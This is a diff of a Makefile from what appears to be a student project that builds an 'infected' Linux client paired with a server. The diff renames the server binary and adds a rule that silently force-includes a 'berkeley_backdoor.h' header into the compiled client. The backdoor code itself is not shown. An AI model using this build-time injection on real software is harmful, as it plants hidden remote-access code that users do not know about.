@@ -6,7 +6,7 @@
 #    By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2026/01/10 19:15:36 by joesanto          #+#    #+#              #
-#    Updated: 2026/01/10 20:21:00 by joesanto         ###   ########.fr        #
+#    Updated: 2026/01/10 20:35:52 by joesanto         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -24,7 +24,7 @@ PROGRAM_NAME := $(notdir $(basename $(INFECT_PROGRAM)))
 LINUX_CLIENT = $(BIN_DIR)/linux_infected_$(PROGRAM_NAME)
 
 # SERVER (LINUX)
-LINUX_SERVER = $(BIN_DIR)/berkeley_server
+LINUX_SERVER = $(BIN_DIR)/linux_server
 
 # ----------------------------------- LIBS ----------------------------------- #
 LIBS_DIR = libs
@@ -40,6 +40,7 @@ CLIENT_DIR = $(SRCS_DIR)/client
 BACKDOORS_DIR = $(CLIENT_DIR)/backdoors
 CLIENT_CONNECTION_DIR = $(CLIENT_DIR)/socket_client_connection
 
+LINUX_BACKDOOR = $(BACKDOORS_DIR)/berkeley_backdoor.h
 LINUX_CLIENT_CONNECTION_SRCS = $(CLIENT_CONNECTION_DIR)/berkeley_client_connection.c
 LINUX_CLIENT_OBJS += $(LINUX_CLIENT_CONNECTION_SRCS:.c=.o) $(INFECT_PROGRAM:.c=.o)
 
@@ -62,6 +63,7 @@ all: $(LINUX_CLIENT) $(LINUX_SERVER)
 $(LINUX_SERVER): $(LIBFT) $(LINUX_SERVER_OBJS)
 	$(CC) $(LINUX_SERVER_OBJS) $(LIBFT) -o $@
 
+$(LINUX_CLIENT): FLAGS += -include $(LINUX_BACKDOOR)
 $(LINUX_CLIENT): $(LINUX_CLIENT_OBJS)
 	$(CC) $^ -o $@
 
